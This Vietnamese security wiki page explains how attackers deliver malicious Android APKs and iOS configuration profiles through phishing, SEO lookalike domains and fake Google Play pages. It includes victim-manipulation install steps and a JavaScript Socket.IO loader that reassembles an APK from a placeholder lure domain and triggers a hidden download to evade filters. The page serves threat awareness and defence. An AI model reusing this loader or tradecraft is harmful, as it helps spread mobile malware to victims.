# Lừa đảo qua thiết bị di động & Phân phối ứng dụng độc hại (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Trang này đề cập đến các kỹ thuật tác nhân đe dọa sử dụng để phân phối **APK Android độc hại** và **profile cấu hình di động iOS** thông qua phishing (SEO, social engineering, cửa hàng giả, ứng dụng hẹn hò, v.v.).
> Nội dung được điều chỉnh từ chiến dịch SarangTrap do Zimperium zLabs phát hiện (2025) và các nghiên cứu công khai khác.<sup>[[1]](#references)</sup>

## Luồng tấn công

1. **Hạ tầng SEO/Phishing**
   * Đăng ký hàng chục tên miền trông giống tên miền thật (hẹn hò, chia sẻ đám mây, dịch vụ xe, v.v.).  
     – Dùng từ khóa và emoji bằng ngôn ngữ địa phương trong phần tử `<title>` để tăng thứ hạng trên Google.  
     – Lưu trữ hướng dẫn cài đặt cho cả Android (`.apk`) lẫn iOS trên cùng một trang đích.
2. **Tải xuống giai đoạn đầu**
   * Android: liên kết trực tiếp đến APK *chưa ký* hoặc APK từ “cửa hàng bên thứ ba”.  
   * iOS: liên kết `itms-services://` hoặc HTTPS thông thường đến profile **mobileconfig** độc hại (xem bên dưới).
3. **Hành vi của Android sau khi cài đặt**
   * Thực thi có điều kiện theo C2, lạm dụng quyền, né tránh dropper, thu thập dữ liệu nền và các hành vi malware khác sau khi cài đặt được đề cập trong trang Android Malware Post-Exploitation riêng bên dưới.
4. **Kỹ thuật phân phối trên iOS**
   * Một **profile cấu hình di động** có thể yêu cầu `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, v.v. để đăng ký thiết bị vào chế độ giám sát kiểu “MDM”.  
   * Hướng dẫn social engineering:
     1. Mở Settings ➜ *Profile downloaded*.
     2. Nhấn *Install* ba lần (có ảnh chụp màn hình trên trang phishing).  
     3. Tin cậy profile chưa ký ➜ kẻ tấn công có được quyền *Contacts* và *Photo* mà không cần qua kiểm duyệt của App Store.
5. **Payload Web Clip trên iOS (biểu tượng ứng dụng phishing)**
   * Payload `com.apple.webClip.managed` có thể **ghim URL phishing lên Home Screen** với biểu tượng/nhãn mang thương hiệu.
   * Web Clip có thể chạy **toàn màn hình** (ẩn giao diện trình duyệt) và được đặt là **không thể xóa**, buộc nạn nhân phải xóa profile để gỡ biểu tượng.<sup>[[3]](#references)</sup>
6. **Lớp mạng**
   * HTTP thuần, thường dùng cổng 80 với header HOST như `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (không có TLS → dễ phát hiện).

## Android Malware Post-Exploitation

Để tìm hiểu các kỹ thuật malware Android sau khi cài đặt như C2, lạm dụng Accessibility, overlay, tự động hóa ATS, nạp DEX theo từng giai đoạn, SMS tính phí cao và duy trì tồn tại, xem:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling dựa trên Socket.IO/WebSocket + Trang Google Play giả mạo

Kẻ tấn công ngày càng thay các liên kết APK tĩnh bằng kênh Socket.IO/WebSocket được nhúng trong các mồi nhử trông giống Google Play. Cách này che giấu URL payload, vượt qua bộ lọc URL/phần mở rộng và vẫn giữ trải nghiệm cài đặt chân thực.<sup>[[2]](#references)[[4]](#references)</sup>

Luồng hoạt động phổ biến của client được quan sát ngoài thực tế:

<details>
<summary>Trình tải giả mạo Google Play dùng Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Vì sao nó né tránh các biện pháp kiểm soát đơn giản:
- Không để lộ URL APK tĩnh; payload được tái tạo trong bộ nhớ từ các frame WebSocket.
- Các bộ lọc URL/MIME/đuôi tệp chặn phản hồi .apk trực tiếp có thể bỏ sót dữ liệu nhị phân được truyền qua WebSocket/Socket.IO.
- Các crawler và sandbox URL không thực thi WebSocket sẽ không tải được payload.

Xem thêm về tradecraft và công cụ WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Mặt tối của tình yêu: Chiến dịch tống tiền SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Cài đặt payload Web Clips cho thiết bị Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Trojan ngân hàng nhắm mục tiêu người dùng Android tại Indonesia và Việt Nam](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
